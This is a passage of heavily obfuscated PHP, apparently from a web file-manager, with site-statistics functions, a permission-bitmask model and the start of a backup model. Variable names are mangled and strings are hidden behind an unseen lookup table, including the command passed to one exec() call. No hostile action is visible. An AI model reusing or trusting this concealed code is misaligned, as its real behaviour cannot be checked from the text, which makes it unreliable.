strtotime($±Çäî´[1890]); $òµˆ¡ª¥ = array(); while ($Å¹¯‹Å <= $çĞ¦¿Æõ) { $òµˆ¡ª¥[] = date($±Çäî´[1889], $Å¹¯‹Å); $Å¹¯‹Å = strtotime($±Çäî´[1892], $Å¹¯‹Å); } return $òµˆ¡ª¥; } public function _recordUser($³¾àŞ× = '') { $ÚøÌØÄ =& $_SERVER[³à¼î¯á]; $Ò£«¡¨§ = strtotime(date($ÚøÌØÄ[1893], strtotime($³¾àŞ×))); $şû¯äøÅ = strtotime(date($ÚøÌØÄ[1894], strtotime($³¾àŞ×))); $¯áıŸ¼• = array($ÚøÌØÄ[222] => array($ÚøÌØÄ[1063], $şû¯äøÅ)); $²ğ¤¯º = Model($ÚøÌØÄ[574])->where($¯áıŸ¼•)->count($ÚøÌØÄ[1753]); $¯áıŸ¼•[$ÚøÌØÄ[222]] = array($ÚøÌØÄ[384], array($Ò£«¡¨§, $şû¯äøÅ)); $ğûé• = Model($ÚøÌØÄ[574])->where($¯áıŸ¼•)->count($ÚøÌØÄ[1753]); $¯áıŸ¼•[$ÚøÌØÄ[33]] = $ÚøÌØÄ[1895]; $Á‡“ñÉã = Model($ÚøÌØÄ[1896])->where($¯áıŸ¼•)->count($ÚøÌØÄ[1897]); $ÎİÜÜ½û = array($ÚøÌØÄ[246] => $³¾àŞ×, $ÚøÌØÄ[810] => (int) $²ğ¤¯º, $ÚøÌØÄ[1882] => (int) $ğûé•, $ÚøÌØÄ[1883] => (int) $Á‡“ñÉã); return $this->insert($ÎİÜÜ½û); } public function _recordStore($«±å¤˜È = '') { $Œœ®¬åº =& $_SERVER[³à¼î¯á]; $‘Œ¥ö€¦ = strtotime(date($Œœ®¬åº[1894], strtotime($«±å¤˜È))); $‰Å¥ª»İ = array($Œœ®¬åº[222] => array($Œœ®¬åº[1063], $‘Œ¥ö€¦)); $°Ç˜ùı‰ = Model($Œœ®¬åº[519])->where($‰Å¥ª»İ)->sum($Œœ®¬åº[79]); $‰Å¥ª»İ[$Œœ®¬åº[460]] = 0; $«ªü“ñ² = Model($Œœ®¬åº[869])->where($‰Å¥ª»İ)->sum($Œœ®¬åº[79]); $‰Å¥ª»İ[$Œœ®¬åº[181]] = 1; $ñÏ†…¶ = Model($Œœ®¬åº[869])->where($‰Å¥ª»İ)->sum($Œœ®¬åº[79]); $‰Å¥ª»İ[$Œœ®¬åº[181]] = 2; $¼õã“é² = Model($Œœ®¬åº[869])->where($‰Å¥ª»İ)->sum($Œœ®¬åº[79]); $ä‘×Ôµç = array($Œœ®¬åº[246] => $«±å¤˜È, $Œœ®¬åº[808] => (int) $«ªü“ñ², $Œœ®¬åº[1886] => (int) $°Ç˜ùı‰, $Œœ®¬åº[1887] => (int) $ñÏ†…¶, $Œœ®¬åº[1888] => (int) $¼õã“é²); return $this->insert($ä‘×Ôµç); } public function trend($€‰ô‚, $¤‡ÖÌâ”) { $Œö©»é =& $_SERVER[³à¼î¯á]; if (!$this->init($€‰ô‚)) { return !1; } $¨Ê–“­É = $this->trendList($€‰ô‚); if ($¨Ê–“­É && $¤‡ÖÌâ” != $Œö©»é[1726]) { $ò§ñ®® = $¨Ê–“­É[0][$Œö©»é[246]]; $šŠ‚À†© = $this->validDate($¤‡ÖÌâ”, $ò§ñ®®); $á°­Ìûà = array(); $œäÜ­ûš = array_to_keyvalue($¨Ê–“­É, $Œö©»é[246]); foreach ($šŠ‚À†© as $¸Ù²¤Ü) { if (isset($œäÜ­ûš[$¸Ù²¤Ü])) { $ËÄ”³ß£ = $œäÜ­ûš[$¸Ù²¤Ü]; } else { $ËÄ”³ß£ = end($¨Ê–“­É); $ËÄ”³ß£[$Œö©»é[246]] = $¸Ù²¤Ü; if ($€‰ô‚ == $Œö©»é[637]) { $ËÄ”³ß£[$Œö©»é[1882]] = $ËÄ”³ß£[$Œö©»é[1883]] = 0; } } $á°­Ìûà[] = $ËÄ”³ß£; } $¨Ê–“­É = $á°­Ìûà; } $÷Ë¸óıì = array($Œö©»é[637] => array($Œö©»é[810] => LNG($Œö©»é[1898]), $Œö©»é[1882] => LNG($Œö©»é[1899]), $Œö©»é[1883] => LNG($Œö©»é[1900])), $Œö©»é[1884] => array($Œö©»é[808] => LNG($Œö©»é[1901]), $Œö©»é[1886] => LNG($Œö©»é[1902]), $Œö©»é[1887] => LNG($Œö©»é[1903]), $Œö©»é[1888] => LNG($Œö©»é[1904]))); $Ëàóå­Á = array($Œö©»é[637] => $Œö©»é[1905], $Œö©»é[1884] => $Œö©»é[79]); if (empty($¨Ê–“­É)) { $¸Ù²¤Ü = date($Œö©»é[1889], strtotime($Œö©»é[1890])); $—Âö÷„ã = array($Œö©»é[246] => $¸Ù²¤Ü); foreach ($÷Ë¸óıì[$€‰ô‚] as $§ì–¿ => $Ü§¡Ä¬ç) { $—Âö÷„ã[$§ì–¿] = 0; } $¨Ê–“­É[] = $—Âö÷„ã; } $Ë”´ŒŒŒ = array(); foreach ($¨Ê–“­É as $Ü§¡Ä¬ç) { if ($€‰ô‚ == $Œö©»é[1884] && $Ü§¡Ä¬ç[$Œö©»é[1886]] > $Ü§¡Ä¬ç[$Œö©»é[808]]) { $Ü§¡Ä¬ç[$Œö©»é[1886]] = $Ü§¡Ä¬ç[$Œö©»é[808]]; } foreach ($÷Ë¸óıì[$€‰ô‚] as $§ì–¿ => $›é€·ù©) { $ËÄ”³ß£ = array($Œö©»é[246] => $Ü§¡Ä¬ç[$Œö©»é[246]], $Œö©»é[1643] => $›é€·ù©); $ËÄ”³ß£[$Ëàóå­Á[$€‰ô‚]] = isset($Ü§¡Ä¬ç[$§ì–¿]) ? $Ü§¡Ä¬ç[$§ì–¿] : 0; $Ë”´ŒŒŒ[] = $ËÄ”³ß£; } } return $Ë”´ŒŒŒ; } public function validDate($½èŠ¦€®, $Ë…ÙíÏÀ) { $¥œæ¹å® =& $_SERVER[³à¼î¯á]; $“÷¾–ó = date($¥œæ¹å®[1889], strtotime($¥œæ¹å®[1890])); $×€Ç»‚ = array($“÷¾–ó); switch ($½èŠ¦€®) { case $¥œæ¹å®[1733]: $†˜«îÛ° = mktime(0, 0, 0, date($¥œæ¹å®[1906]), date($¥œæ¹å®[1420]) - date($¥œæ¹å®[1514]) + 7 - 7, date($¥œæ¹å®[1907])); $š‰çƒáƒ = 0; do { $ÁÖÀèÉ­ = date($¥œæ¹å®[1889], $†˜«îÛ° - 3600 * 24 * 7 * $š‰çƒáƒ); $×€Ç»‚[] = $ÁÖÀèÉ­; $š‰çƒáƒ++; } while ($Ë…ÙíÏÀ < $ÁÖÀèÉ­); break; case $¥œæ¹å®[1731]: $š‰çƒáƒ = 1; do { $ÃâËÉÍ„ = date($¥œæ¹å®[1908], strtotime("\55\40{$š‰çƒáƒ}\40\155\157\156\164\x68\x73")); $×€Ç»‚[] = $ÃâËÉÍ„; $š‰çƒáƒ++; } while ($Ë…ÙíÏÀ < $ÃâËÉÍ„); break; case $¥œæ¹å®[1909]: $¤ø§¨Ìˆ = (int) date($¥œæ¹å®[1907], strtotime($Ë…ÙíÏÀ)); $¸ãŸ“•¤ = (int) date($¥œæ¹å®[1907]); if ($¤ø§¨Ìˆ >= $¸ãŸ“•¤) { break; } for ($¤ø§¨Ìˆ; $¤ø§¨Ìˆ < $¸ãŸ“•¤; $¤ø§¨Ìˆ++) { $×€Ç»‚[] = $¤ø§¨Ìˆ . $¥œæ¹å®[1910]; } break; default: break; } if ($Ë…ÙíÏÀ > end($×€Ç»‚)) { array_pop($×€Ç»‚); } sort($×€Ç»‚); return $×€Ç»‚; } public function listTable($„–¹‡ï®) { $üèÇ§µ = ucfirst($„–¹‡ï®); return Model($üèÇ§µ)->listData(); } public function option($Ç¥ß«ÏŞ) { $ñ‚©·æç = $_SERVER[³à¼î¯á][1911] . ucfirst($Ç¥ß«ÏŞ); return $this->{$ñ‚©·æç}(); } private function optionUser() { $‹ß†Áßû =& $_SERVER[³à¼î¯á]; $ú½ùÏ©œ = Model($‹ß†Áßû[574])->count($‹ß†Áßû[1753]); $°¯ØÜƒ = Model($‹ß†Áßû[574])->where($‹ß†Áßû[1912])->count($‹ß†Áßû[1753]); $ğ—©³ØÎ = intval($GLOBALS[$‹ß†Áßû[6]][$‹ß†Áßû[400]][$‹ß†Áßû[1699]]) / 3600; $ğ¢´£›¨ = strtotime("\x2d{$ğ—©³ØÎ}\40\150\157\x75\162\x73"); $ßÛ’ñàÄ = strtotime(date($‹ß†Áßû[1893])); if ($ğ¢´£›¨ < $ßÛ’ñàÄ) { $ğ¢´£›¨ = $ßÛ’ñàÄ; } $–²í¨ß = array($‹ß†Áßû[1913] => array($‹ß†Áßû[1064], $ğ¢´£›¨)); $íÎáÆÒ = (int) Model($‹ß†Áßû[574])->where($–²í¨ß)->count($‹ß†Áßû[1753]); if (!$íÎáÆÒ) { $íÎáÆÒ = 1; } $–²í¨ß = array($‹ß†Áßû[1913] => array($‹ß†Áßû[1064], $ßÛ’ñàÄ)); $ç£„Ëåø = Model($‹ß†Áßû[574])->where($–²í¨ß)->count($‹ß†Áßû[1753]); return array($‹ß†Áßû[803] => (int) $ú½ùÏ©œ, $‹ß†Áßû[1914] => (int) ($ú½ùÏ©œ - $°¯ØÜƒ), $‹ß†Áßû[1915] => (int) $°¯ØÜƒ, $‹ß†Áßû[1916] => (int) $ç£„Ëåø, $‹ß†Áßû[1917] => $íÎáÆÒ); } private function optionFile() { $’¤“† =& $_SERVER[³à¼î¯á]; $æìù¡Ú‘ = $this->sourceSize(); $ÎÉ„ÄË = $æìù¡Ú‘[$’¤“†[79]]; $Ó¼¡¦ß  = $æìù¡Ú‘[$’¤“†[1886]]; $›«º‰‰ = Model($’¤“†[869])->where(array($’¤“†[460] => 0))->count($’¤“†[184]); $º”ë›„õ = array($’¤“†[460] => 0, $’¤“†[222] => array($’¤“†[1064], strtotime(date($’¤“†[1893])))); $èúÒı‚ = Model($’¤“†[869])->where($º”ë›„õ)->sum($’¤“†[79]); $º«…ä«Ó = Model($’¤“†[869])->where($º”ë›„õ)->count($’¤“†[184]); return array($’¤“†[808] => $ÎÉ„ÄË, $’¤“†[1886] => $Ó¼¡¦ß , $’¤“†[1918] => $ÎÉ„ÄË - $Ó¼¡¦ß , $’¤“†[1919] => (int) $èúÒı‚, $’¤“†[810] => (int) $›«º‰‰, $’¤“†[1920] => (int) $º«…ä«Ó); } private function optionAccess() { $æ©ˆˆ«¦ =& $_SERVER[³à¼î¯á]; return array($æ©ˆˆ«¦[803] => $this->typeLogCnt(), $æ©ˆˆ«¦[110] => $this->typeLogCnt($æ©ˆˆ«¦[110]), $æ©ˆˆ«¦[500] => $this->typeLogCnt($æ©ˆˆ«¦[500]), $æ©ˆˆ«¦[1921] => $this->typeLogCnt($æ©ˆˆ«¦[1921]), $æ©ˆˆ«¦[1922] => $this->typeLogCnt($æ©ˆˆ«¦[1922]), $æ©ˆˆ«¦[637] => $this->typeLogCnt($æ©ˆˆ«¦[12], $æ©ˆˆ«¦[1897])); } private function typeLogCnt($­¾ø™ ª = '', $Æë¡íØÖ = "\x69\144") { $Ü—äãË“ =& $_SERVER[³à¼î¯á]; $Û•Ã´íú = array($Ü—äãË“[110] => array($Ü—äãË“[1923], $Ü—äãË“[1924]), $Ü—äãË“[500] => array($Ü—äãË“[1925], $Ü—äãË“[1926]), $Ü—äãË“[1921] => array($Ü—äãË“[1927], $Ü—äãË“[1928], $Ü—äãË“[1929]), $Ü—äãË“[1922] => array($Ü—äãË“[1930], $Ü—äãË“[1931]), $Ü—äãË“[1932] => array($Ü—äãË“[1933], $Ü—äãË“[1934], $Ü—äãË“[1935])); $Œ¾’çãŞ = strtotime(date($Ü—äãË“[1893])); $Â–î¸ = array($Ü—äãË“[222] => array($Ü—äãË“[1064], $Œ¾’çãŞ)); if ($­¾ø™ ª) { $Â–î¸[$Ü—äãË“[33]] = array($Ü—äãË“[7], $Û•Ã´íú[$­¾ø™ ª]); } $ï€ÓƒÅ» = Model($Ü—äãË“[1896])->where($Â–î¸)->count($Æë¡íØÖ); return (int) $ï€ÓƒÅ»; } private function optionServer() { $ÂÜÓüªğ =& $_SERVER[³à¼î¯á]; $ìÇÒ‚Õ = $this->diskDriver(); $Şè¢¾â = KodIO::defaultDriver(); $Ï„ê¥à… = array($ÂÜÓüªğ[861] => $Şè¢¾â[$ÂÜÓüªğ[450]]); $şê§É = Model($ÂÜÓüªğ[519])->where($Ï„ê¥à…)->sum($ÂÜÓüªğ[79]); $ü²ı¹È¬ = explode($ÂÜÓüªğ[53], $_SERVER[$ÂÜÓüªğ[147]]); $ÚÖÉ¸¨ö = $ü²ı¹È¬[0]; $ÑØ¿‚ò¡ = $GLOBALS[$ÂÜÓüªğ[6]][$ÂÜÓüªğ[21]]; $¨ÓÒÅ¹ = $ÑØ¿‚ò¡[$ÂÜÓüªğ[1026]]; if ($¨ÓÒÅ¹ == $ÂÜÓüªğ[1014]) { $²ø—úé† = explode($ÂÜÓüªğ[1336], $ÑØ¿‚ò¡[$ÂÜÓüªğ[1025]]); $¨ÓÒÅ¹ = $²ø—úé†[0]; } if ($¨ÓÒÅ¹ == $ÂÜÓüªğ[960] || $¨ÓÒÅ¹ == $ÂÜÓüªğ[848]) { $ŠŠó¦Å® = Model()->db()->query($ÂÜÓüªğ[1936]); $ö‹ë«ä² = $ŠŠó¦Å®[0] && isset($ŠŠó¦Å®[0][$ÂÜÓüªğ[1642]]) ? $ŠŠó¦Å®[0][$ÂÜÓüªğ[1642]] : 0; $¨ÓÒÅ¹ = $ÂÜÓüªğ[1937] . ($ö‹ë«ä² ? $ÂÜÓüªğ[8] . $ö‹ë«ä² : $ÂÜÓüªğ[12]); } $°ÊÍàŸÖ = $GLOBALS[$ÂÜÓüªğ[6]][$ÂÜÓüªğ[400]][$ÂÜÓüªğ[871]]; return array($ÂÜÓüªğ[1938] => $ìÇÒ‚Õ ? $ìÇÒ‚Õ[$ÂÜÓüªğ[1939]] : 0, $ÂÜÓüªğ[1940] => $ìÇÒ‚Õ ? $ìÇÒ‚Õ[$ÂÜÓüªğ[1941]] : 0, $ÂÜÓüªğ[1942] => (int) $Şè¢¾â[$ÂÜÓüªğ[1939]] * 1024 * 1024 * 1024, $ÂÜÓüªğ[1943] => (int) $şê§É, $ÂÜÓüªğ[1944] => ucfirst($ÚÖÉ¸¨ö), $ÂÜÓüªğ[1945] => $ÂÜÓüªğ[1946] . PHP_VERSION, $ÂÜÓüªğ[1947] => phpBuild64() ? 64 : 32, $ÂÜÓüªğ[802] => str_replace($ÂÜÓüªğ[1183], $ÂÜÓüªğ[1042], $¨ÓÒÅ¹), $ÂÜÓüªğ[400] => ucfirst($°ÊÍàŸÖ), $ÂÜÓüªğ[32] => $_SERVER[$ÂÜÓüªğ[1948]]); } private function diskDriver() { $¾À…Ëô =& $_SERVER[³à¼î¯á]; $ú¦³³ë = $¾À…Ëô[8]; $¢šò‰Æ’ = $GLOBALS[$¾À…Ëô[6]][$¾À…Ëô[1353]] == $¾À…Ëô[1354]; if ($¢šò‰Æ’) { $ú¦³³ë = $¾À…Ëô[1949]; if (function_exists($¾À…Ëô[1950])) { exec($¾À…Ëô[1951], $Ş•‰°œş); $ú¦³³ë = $Ş•‰°œş[1] . $¾À…Ëô[8]; } } if (!file_exists($ú¦³³ë)) { return; } $æÍŸïâ± = @disk_total_space($ú¦³³ë); $„öï²ˆ = $æÍŸïâ± - @disk_free_space($ú¦³³ë); return array($¾À…Ëô[1939] => $æÍŸïâ±, $¾À…Ëô[1941] => $„öï²ˆ); } public function fileChart($ëÉ¾‰ å) { $Í²€Ü”É =& $_SERVER[³à¼î¯á]; if (isset($ëÉ¾‰ å[$Í²€Ü”É[1753]])) { return Model($Í²€Ü”É[869])->userFileTypeProfile($ëÉ¾‰ å[$Í²€Ü”É[1753]]); } if (isset($ëÉ¾‰ å[$Í²€Ü”É[1952]])) { return Model($Í²€Ü”É[869])->groupFileTypeProfile($ëÉ¾‰ å[$Í²€Ü”É[1952]]); } $Ş«½¿ùµ = $this->sourceSize(); $™å¯Æõ­ = array($Í²€Ü”É[183] => 0, $Í²€Ü”É[181] => 1); $æ¹»ĞÁÂ = Model($Í²€Ü”É[869])->where($™å¯Æõ­)->sum($Í²€Ü”É[79]); $™å¯Æõ­[$Í²€Ü”É[181]] = 2; $¯µÂÑÃä = Model($Í²€Ü”É[869])->where($™å¯Æõ­)->sum($Í²€Ü”É[79]); return array($Í²€Ü”É[808] => $Ş«½¿ùµ[$Í²€Ü”É[79]], $Í²€Ü”É[1886] => $Ş«½¿ùµ[$Í²€Ü”É[1886]], $Í²€Ü”É[1887] => (int) $æ¹»ĞÁÂ, $Í²€Ü”É[1888] => (int) $¯µÂÑÃä); } private function sourceSize() { $½„ıÊ¯ =& $_SERVER[³à¼î¯á]; $í°ş¼³İ = Model($½„ıÊ¯[869])->where(array($½„ıÊ¯[460] => 0))->sum($½„ıÊ¯[79]); $ûé®”òĞ = Model($½„ıÊ¯[519])->sum($½„ıÊ¯[79]); if ($ûé®”òĞ > $í°ş¼³İ) { $ûé®”òĞ = $í°ş¼³İ; } return array($½„ıÊ¯[79] => (int) $í°ş¼³İ, $½„ıÊ¯[1886] => (int) $ûé®”òĞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $œÚİËç =& $_SERVER[³à¼î¯á]; $Ùİ»ìÜÍ = array(array($œÚİËç[469] => LNG($œÚİËç[1953]), $œÚİËç[1954] => $œÚİËç[1955], $œÚİËç[1956] => 1, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($œÚİËç[469] => LNG($œÚİËç[1959]), $œÚİËç[1954] => $œÚİËç[1960], $œÚİËç[1956] => 2, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($œÚİËç[469] => LNG($œÚİËç[1961]), $œÚİËç[1954] => $œÚİËç[1962], $œÚİËç[1956] => 3, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($œÚİËç[469] => LNG($œÚİËç[1963]), $œÚİËç[1954] => $œÚİËç[1964], $œÚİËç[1956] => 4, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_VIEW), array($œÚİËç[469] => LNG($œÚİËç[1965]), $œÚİËç[1954] => $œÚİËç[1966], $œÚİËç[1956] => 5, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($œÚİËç[469] => LNG($œÚİËç[1967]), $œÚİËç[1954] => $œÚİËç[1968], $œÚİËç[1956] => 6, $œÚİËç[1957] => 1, $œÚİËç[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($œÚİËç[469] => LNG($œÚİËç[1969]), $œÚİËç[1954] => $œÚİËç[1970], $œÚİËç[1956] => 7, $œÚİËç[1957] => 1, $œÚİËç[1958] => 0)); return $Ùİ»ìÜÍ; } public static function authCheck($å¿ñ«, $™æïú) { $®ã²˜À =& $_SERVER[³à¼î¯á]; $å¿ñ« = intval($å¿ñ«); if (KodUser::isRoot() && $GLOBALS[$®ã²˜À[6]][$®ã²˜À[1971]]) { return !0; } if ($å¿ñ« <= 0) { return !1; } if (($å¿ñ« & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($å¿ñ« & $™æïú); } public static function authCheckShow($¥”Á°„ı) { return self::authCheck($¥”Á°„ı, self::AUTH_SHOW); } public static function authCheckView($ôŸÛ‚Ëñ) { return self::authCheck($ôŸÛ‚Ëñ, self::AUTH_VIEW); } public static function authCheckDownload($Œü²äªğ) { return self::authCheck($Œü²äªğ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ğ‡™˜ş) { return self::authCheck($Ğ‡™˜ş, self::AUTH_UPLOAD); } public static function authCheckEdit($ïÖ¿åÇ‰) { return self::authCheck($ïÖ¿åÇ‰, self::AUTH_EDIT); } public static function authCheckRemove($—Í±Á°ì) { return self::authCheck($—Í±Á°ì, self::AUTH_REMOVE); } public static function authCheckShare($‘ˆ†¿Ş) { return self::authCheck($‘ˆ†¿Ş, self::AUTH_SHARE); } public static function authCheckComment($½²Á Ğ) { return self::authCheck($½²Á Ğ, self::AUTH_COMMENT); } public static function authCheckEvent($ÙÌ‘ù±‚) { return self::authCheck($ÙÌ‘ù±‚, self::AUTH_EVENT); } public static function authCheckRoot($ï˜ÌÑ‰¾) { return self::authCheck($ï˜ÌÑ‰¾, self::AUTH_ROOT); } public static function authCheckAction($éÖ¾»®ª, $ŠÃãĞåñ) { $Â›Î›ê· =& $_SERVER[³à¼î¯á]; $ÂöË£ºË = array($Â›Î›ê·[1972] => self::AUTH_VIEW, $Â›Î›ê·[1248] => self::AUTH_DOWNLOAD, $Â›Î›ê·[110] => self::AUTH_UPLOAD, $Â›Î›ê·[1922] => self::AUTH_EDIT, $Â›Î›ê·[1921] => self::AUTH_REMOVE, $Â›Î›ê·[1932] => self::AUTH_SHARE, $Â›Î›ê·[405] => self::AUTH_COMMENT, $Â›Î›ê·[1741] => self::AUTH_EVENT, $Â›Î›ê·[1973] => self::AUTH_ROOT); if (!isset($ÂöË£ºË[$ŠÃãĞåñ])) { return; } $“–Û¦Ûè = $ÂöË£ºË[$ŠÃãĞåñ]; $éÖ¾»®ª = intval($éÖ¾»®ª); if ($éÖ¾»®ª <= 0) { return !1; } if (($éÖ¾»®ª & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($éÖ¾»®ª & $“–Û¦Ûè); } public static function authDisable($³´Ş´Ü, $µ“şÕîÛ) { if (intval($³´Ş´Ü) <= 0) { return 0; } return intval($³´Ş´Ü) & ~$µ“şÕîÛ; } public $optionType = "\123\171\163\164\x65\155\x2e\163\157\x75\162\x63\145\101\165\x74\150\x4c\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\x68", "\x6c\141\x62\x65\154", "\144\151\x73\x70\x6c\141\x79", "\x73\171\x73\x74\x65\155", "\163\157\x72\x74"); public function initData() { $™æ®äÌ = $this->authDefault(); foreach ($™æ®äÌ as $’Àş¦×¶) { $this->add($’Àş¦×¶); } } public function findAuth($Ûû¨Ôì, $Ñ…ñĞâÍ) { $şúòÌ¹Ò =& $_SERVER[³à¼î¯á]; $‹ĞäÄ©ƒ = parent::listData(); foreach ($‹ĞäÄ©ƒ as $É‘¨”À‡) { $¶ÊÓ£ = intval($É‘¨”À‡[$şúòÌ¹Ò[462]]); if ($¶ÊÓ£ <= 0 || $É‘¨”À‡[$şúòÌ¹Ò[1974]] == 0) { continue; } if (($¶ÊÓ£ & $Ûû¨Ôì) != $Ûû¨Ôì) { continue; } if (($¶ÊÓ£ & $Ñ…ñĞâÍ) != 0) { continue; } return $É‘¨”À‡[$şúòÌ¹Ò[450]]; } return !1; } public function findAuthReadOnly() { $”¢Œ’ñ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ªŒÓáó… = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($”¢Œ’ñ, $ªŒÓáó…); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $¡åûÒ =& $_SERVER[³à¼î¯á]; $ó¸ïæ¬ = parent::listData(); $ôøÔŸÃ… = !1; foreach ($ó¸ïæ¬ as $şòúæÔ) { if ($şòúæÔ[$¡åûÒ[462]] <= 0 || $şòúæÔ[$¡åûÒ[1974]] == $¡åûÒ[219]) { continue; } if (!$ôøÔŸÃ…) { $ôøÔŸÃ… = $şòúæÔ; continue; } if ($ôøÔŸÃ…[$¡åûÒ[462]] > $şòúæÔ[$¡åûÒ[462]]) { $ôøÔŸÃ… = $şòúæÔ; } } return $ôøÔŸÃ… ? $ôøÔŸÃ…[$¡åûÒ[450]] : $¡åûÒ[12]; } public function listData($Ü‚Š’ˆê = false, $ÍÊ¸Áù = "\x73\x6f\x72\x74", $†æÕÀ‚î = false) { return parent::listData($Ü‚Š’ˆê, $ÍÊ¸Áù, $†æÕÀ‚î); } public function update($ÌÜü°¶¬, $­îšä¾Ø) { $¨åû…Å‹ =& $_SERVER[³à¼î¯á]; $£ì®½¢¨ = parent::listData($ÌÜü°¶¬); $æÖ½Ü§Ï = $this->findByName($­îšä¾Ø[$¨åû…Å‹[32]]); if (!$£ì®½¢¨ || $æÖ½Ü§Ï && $æÖ½Ü§Ï[$¨åû…Å‹[450]] != $£ì®½¢¨[$¨åû…Å‹[450]]) { return !1; } $this->filterAuth($­îšä¾Ø[$¨åû…Å‹[462]]); return parent::update($ÌÜü°¶¬, $­îšä¾Ø); } public function remove($ÛµÄ«¼) { $‡Ë²Äõä = parent::listData($ÛµÄ«¼); if (!$‡Ë²Äõä || $‡Ë²Äõä[$_SERVER[³à¼î¯á][182]]) { return !1; } return parent::remove($ÛµÄ«¼); } public function add($·œî™Ú‡ = array()) { $ä›‡é°¿ =& $_SERVER[³à¼î¯á]; if ($this->findByName($·œî™Ú‡[$ä›‡é°¿[32]])) { return !1; } $Ú×Û´î‚ = array($ä›‡é°¿[32] => $ä›‡é°¿[12], $ä›‡é°¿[462] => 1, $ä›‡é°¿[1975] => $ä›‡é°¿[1962], $ä›‡é°¿[1974] => 1, $ä›‡é°¿[182] => 0, $ä›‡é°¿[1976] => 0); $·œî™Ú‡ = array_merge($Ú×Û´î‚, $·œî™Ú‡); $·œî™Ú‡[$ä›‡é°¿[1976]] = $this->getSort(); $this->filterAuth($·œî™Ú‡[$ä›‡é°¿[462]]); return parent::insert($·œî™Ú‡); } private function getSort() { $ëïáúÜ =& $_SERVER[³à¼î¯á]; $ƒ³Ç±Å = parent::listData(); $Ğ£²êü = array_to_keyvalue($ƒ³Ç±Å, $ëïáúÜ[12], $ëïáúÜ[1976]); return empty($Ğ£²êü) ? 0 : max($Ğ£²êü) + 1; } private function filterAuth(&$›òÑëû) { if (!$›òÑëû) { return; } $øÙ¬…¬ü = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ù×Øƒ©Ã = array(); foreach ($øÙ¬…¬ü as $Òı¾‚Ô) { if ($›òÑëû & $Òı¾‚Ô) { $Ù×Øƒ©Ã[] = $Òı¾‚Ô; } } if (in_array(self::AUTH_ROOT, $Ù×Øƒ©Ã)) { $›òÑëû = array_sum($øÙ¬…¬ü); return; } $åÈ¼ˆ¨ƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ù×Øƒ©Ã as $Òı¾‚Ô) { if (isset($åÈ¼ˆ¨ƒ[$Òı¾‚Ô])) { $Ù×Øƒ©Ã = array_merge($Ù×Øƒ©Ã, $åÈ¼ˆ¨ƒ[$Òı¾‚Ô]); } } $Ù×Øƒ©Ã[] = self::AUTH_SHOW; $›òÑëû = array_sum(array_unique($Ù×Øƒ©Ã)); } public function sort($·ÄŸñ¬–, $è×ù»„è) { return parent::update($·ÄŸñ¬–, $è×ù»„è); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\142\141\143\x6b\x75\160\114\151\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\x73\x74\x61\x74\x75\163", "\x63\x6f\x6e\x74\145\x6e\x74", "\x6d\x61\x6e\165\141\x6c", "\x72\x65\x73\165\154\x74", "\164\x69\155\145\106\162\157\155", "\164\x69\x6d\145\x54\x6f"); public function config() { $â·ïô©Á =& $_SERVER[³à¼î¯á]; $ºµ«‹Š† = Model($â·ïô©Á[815])->get($â·ïô©Á[827]); $ºµ«‹Š† = json_decode($ºµ«‹Š†, !0); $ºµ«‹Š† = is_array($ºµ«‹Š†) ? $ºµ«‹Š† : array(); if (!isset($ºµ«‹Š†[$â·ïô©Á[799]])) { $ºµ«‹Š†[$â·ïô©Á[799]] = $â·ïô©Á[91]; } unset($ºµ«‹Š†[$â·ïô©Á[1723]]); Action($â·ïô©Á[1977])->taskInit(); Model($â·ïô©Á[1722])->cacheClear(); $Á”¯ÓçÅ = $â·ïô©Á[1978]; $¤Ò€µäø = 